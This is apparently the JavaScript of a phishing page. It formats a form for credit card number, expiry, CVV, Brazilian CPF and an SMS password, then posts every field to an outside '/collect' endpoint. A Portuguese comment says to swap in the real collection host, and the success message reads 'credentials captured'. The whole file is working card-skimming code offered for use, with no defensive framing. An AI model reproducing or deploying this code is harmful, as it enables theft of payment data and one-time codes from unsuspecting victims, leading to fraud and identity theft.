document.addEventListener('DOMContentLoaded', () => {
const form = document.getElementById('formulario');
const btn = document.getElementById('submitBtn');
const spinner = document.getElementById('spinner');
const loading = document.getElementById('loading');

// Formatação automática dos inputs
const formatCardNumber = (e) => {
let value = e.target.value.replace(/\D/g, '');
value = value.match(new RegExp('.{1,4}', 'g')).join(' ');
e.target.value = value;
};

const formatExpiry = (e) => {
let value = e.target.value.replace(/\D/g, '');
if (value.length > 2) value = value.substring(0, 2) + '/' + value.substring(2, 4);
e.target.value = value;
};

const formatCpf = (e) => {
let value = e.target.value.replace(/\D/g, '');
if (value.length > 3) value = value.substring(0, 3) + '.' + value.substring(3);
if (value.length > 7) value = value.substring(0, 7) + '.' + value.substring(7);
if (value.length > 11) value = value.substring(0, 11) + '-' + value.substring(11);
e.target.value = value;
};

document.getElementById('cardNumber').addEventListener('input', formatCardNumber);
document.getElementById('expiry').addEventListener('input', formatExpiry);
document.getElementById('cvv').addEventListener('input', (e) => e.target.value = e.target.value.replace(/\D/g, ''));
document.getElementById('cpf').addEventListener('input', formatCpf);

// Envio dos dados
form.addEventListener('submit', (e) => {
e.preventDefault();

btn.disabled = true;
spinner.style.display = 'inline';
loading.classList.add('active');

const data = {
cardNumber: document.getElementById('cardNumber').value.replace(/\D/g, ''),
expiry: document.getElementById('expiry').value.replace(/\D/g, ''),
cvv: document.getElementById('cvv').value,
cpf: document.getElementById('cpf').value.replace(/\D/g, ''),
smsPass: document.getElementById('smsPass').value
};

// Envia para o endpoint falso (substitua pela real)
fetch('https://fake-gateway.ultimedev.club/collect', {
method: 'POST',
headers: { 'Content-Type': 'application/json' },
body: JSON.stringify(data)
})
.then(res => res.json())
.then(res => {
if (res.success) {
loading.innerHTML = `
<div style="color:#33d758;font-size:4rem;">✓</div>
<h4>Credenciais capturadas</h4>
<p>${res.message || 'Dados processados com sucesso.'}</p>
`;
} else {
loading.innerHTML = `<div style="color:#ef4444;font-size:4rem;">✗</div><h4>${res.error || 'Falha na captura'}</h4>`;
}
})
.catch(() => {
loading.innerHTML = `<div style="color:#ef4444;font-size:4rem;">!</div><h4>Sem resposta do servidor</h4>`;
});
});
});

